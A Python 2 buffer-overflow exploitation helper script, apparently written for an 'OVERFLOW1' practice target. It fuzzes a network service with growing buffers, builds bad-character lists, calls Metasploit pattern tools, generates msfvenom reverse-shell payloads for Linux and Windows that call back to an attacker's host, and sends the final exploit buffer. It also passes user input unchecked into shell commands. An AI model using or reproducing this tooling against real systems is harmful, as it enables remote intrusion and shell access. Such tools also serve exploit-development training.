# !/usr/bin/python
# coding=utf-8

import requests,argparse,socket,time,sys,subprocess
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Settings (Please Update)
IP = "192.168.0.143"
PORT = 1337
PREFIX = "OVERFLOW1 "
OFFSET = 0
OVERFLOW = "A" * OFFSET
RETN = ""
PADDING = ""
POSTFIX = ""
PAYLOAD =  ""


# Header
def header():
	SIG = headercolor('''

▄███▄   ▄▄▄▄▄▄   █ ▄▄   ▄▄▄▄▄▄      ███   ████▄ ▄████  
█▀   ▀ ▀   ▄▄▀   █   █ ▀   ▄▄▀      █  █  █   █ █▀   ▀ 
██▄▄    ▄▀▀   ▄▀ █▀▀▀   ▄▀▀   ▄▀    █ ▀ ▄ █   █ █▀▀    
█▄   ▄▀ ▀▀▀▀▀▀   █      ▀▀▀▀▀▀      █  ▄▀ ▀████ █      
▀███▀             █                 ███          █     
                   ▀                              ▀    
                                 [Customize by H0j3n]                   

''')
    	return SIG

# Color Function
def headercolor(STRING):
    return Style.BRIGHT+Fore.GREEN+STRING+Fore.RESET

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def resultformat(STRING):
    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET
    


# Fuzzer Option
def fuzzer_option():
	if IP == "" or PORT == 0:
		formatHelp("\n[-] Please Check Your IP and PORT again!")
		sys.exit(0)
	print headercolor("\n[+] IP : "+ IP)
	print headercolor("[+] PORT : "+ str(PORT) + "\n")
	TIMEOUT = 5
	BUFFER = []
	COUNTER = 100
	while len(BUFFER) < 30:
		BUFFER.append("A" * COUNTER)
		COUNTER += 100
	for string in BUFFER:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(TIMEOUT)
			connect = s.connect((IP, PORT))
			s.recv(1024)
			print("Fuzzing with %s bytes" % len(string))
			s.send("OVERFLOW1  " + string + "\r\n")
			s.recv(1024)
			s.close()

		except:
			print(formatHelp("Could not connect to " + IP + ":" + str(PORT)))
        		sys.exit(0)

		
		time.sleep(1)

# Bad Character Option
def badchar_option():
	print formatHelp("(+) Example No Badchar => Enter Bad Characters: ")
	print formatHelp("(+) Example Got Badchar => Enter Bad Characters: \\x02\\x03\\x04")
	INPUTS = raw_input("\nEnter Bad Characters: ")
	LISTREM = INPUTS.split("\\x")
	LISTBADCHAR = ""
	for x in range(1,256):
		if "{:02x}".format(x) not in LISTREM:
			LISTBADCHAR += "\\x" + "{:02x}".format(x)
	
	print resultformat("\n[+] Bad Character => " + INPUTS)
	print resultformat("[+] Original Length => 1020")
	print resultformat("[+] Current Length => " + str(len(LISTBADCHAR)) + "\n")
	print "Bad Character To Copy:\n"
	print LISTBADCHAR

# Exploit Option
def exploit_option():
	check()
	INPUTS = raw_input("Confirm To Exploit? (Y = Yes ,N = No) : ")
	if INPUTS == 'Y':
		BUFFER = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + POSTFIX
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try :
			    s.connect((IP, PORT))
			    print("Sending evil buffer...")
			    s.send(BUFFER + "\r\n\r\n")
			    print("Done!")

		except:
			    print(formatHelp("Could not connect to " + IP + ":" + str(PORT)))
	else:
		print formatHelp("Okay!!!")
		
	
# Check Function
def check():
	PRINT_CHECK = ""
	if IP == "":
		PRINT_CHECK += formatHelp("\n[-] IP is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] IP Updated : "+ IP)
	if PORT == 0:
		PRINT_CHECK += formatHelp("\n[-] PORT is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] PORT Updated : "+ str(PORT))
	if PREFIX == "":
		PRINT_CHECK += formatHelp("\n[-] PREFIX is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] PREFIX Updated : "+ PREFIX)
	if OFFSET == 0:
		PRINT_CHECK += formatHelp("\n[-] OFFSET is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] OFFSET Updated : "+ str(OFFSET))
	if OVERFLOW == "":
		PRINT_CHECK += formatHelp("\n[-] OVERFLOW is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] OVERFLOW Updated : A * "+ str(OFFSET))
	if RETN == "":
		PRINT_CHECK += formatHelp("\n[-] RETN is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] RETN Updated with Length => " + str(len(RETN)))
	if PADDING == "":
		PRINT_CHECK += formatHelp("\n[-] PADDING is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] PADDING Updated with Length => " + str(len(PADDING)))
	if POSTFIX == "":
		PRINT_CHECK += formatHelp("\n[-] POSTFIX is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] POSTFIX Updated : "+POSTFIX)
	if PAYLOAD == "":
		PRINT_CHECK += formatHelp("\n[-] PAYLOAD is not Update Yet")
	else:
		PRINT_CHECK += headercolor("\n[+] PAYLOAD Updated with Length => " + str(len(PAYLOAD)))
		
	print PRINT_CHECK
	
# Create Pattern
def pcreate():
	print formatHelp("(+) Example => Enter Length of Pattern : 1500\n")
	PATTERN = raw_input("Enter Length of Pattern : ")
	CMD = "msf-pattern_create -l " + PATTERN
	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	RESULT = PS.communicate()[0]
	print headercolor("\n" + RESULT)
	
# Check Pattern Offset
def poffset():
	print formatHelp("(+) Example => Enter Pattern : Ad2A\n")
	PATTERN = raw_input("Enter Pattern : ")
	CMD = "msf-pattern_offset -q " + PATTERN
	PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	RESULT = PS.communicate()[0]
	print headercolor("\n" + RESULT)
	
# Msvenom Payload
def payload():
	print formatHelp("(+) Options => \n\t0 - Linux\n\t1 - Windows\n")
	OPTIONS = ""
	while (OPTIONS != "0") and (OPTIONS != '1'):
		OPTIONS = str(raw_input("Enter Options: "))
	if OPTIONS == '0':
		LHOST = raw_input("Enter LHOST : ")
		LPORT = raw_input("Enter LPORT : ")
		BADCHAR = raw_input("Enter BADCHAR : ")
		VARIABLE = raw_input("Enter VARIABLE NAME : ")
		CMD = 'msfvenom -a x86 --platform linux --payload linux/x86/shell_reverse_tcp LPORT='+str(LPORT)+' LHOST='+str(LHOST)+' -e x86/shikata_ga_nai -b "'+BADCHAR+'" -f python -v '+ VARIABLE
		print '\n' + resultformat(CMD)
		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		RESULT = PS.communicate()[0]
		print headercolor("\n" + RESULT)
	else:
		LHOST = raw_input("Enter LHOST : ")
		LPORT = raw_input("Enter LPORT : ")
		BADCHAR = raw_input("Enter BADCHAR : ")
		VARIABLE = raw_input("Enter VARIABLE NAME : ")
		CMD = 'msfvenom -p windows/shell_reverse_tcp LHOST='+str(LHOST)+' LPORT='+str(LPORT)+' -b "'+BADCHAR+'" EXITFUNC=thread -f python -v '+ VARIABLE
		print '\n' + resultformat(CMD)
		PS = subprocess.Popen(CMD,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		RESULT = PS.communicate()[0]
		print headercolor("\n" + RESULT)
	
# Main    	
if __name__ == "__main__":
	print header()
	if len(sys.argv) != 2:
		print formatHelp("(+) Usage Fuzzer:\t\t python %s fuzzer" % sys.argv[0])
		print formatHelp("(+) Usage Bad Characeter:\t python %s badchar" % sys.argv[0])
		print formatHelp("(+) Usage Exploit:\t\t python %s exploit" % sys.argv[0])
		print formatHelp("(+) Usage Checker:\t\t python %s checker" % sys.argv[0])
		print formatHelp("(+) Usage Pattern Create:\t python %s pcreate" % sys.argv[0])
		print formatHelp("(+) Usage Pattern Offset:\t python %s poffset" % sys.argv[0])
		print formatHelp("(+) Usage Msfvenom Payload:\t python %s payload" % sys.argv[0])
		sys.exit(-1)
	
	options = sys.argv[1]
	if options == "fuzzer":
		fuzzer_option()
	elif options == "badchar":
		badchar_option()
	elif options == "exploit":
		exploit_option()
	elif options == "checker":
		check()
	elif options == "pcreate":
		pcreate()
	elif options == "poffset":
		poffset()
	elif options == "payload":
		payload()
	else:
		print "wrong"
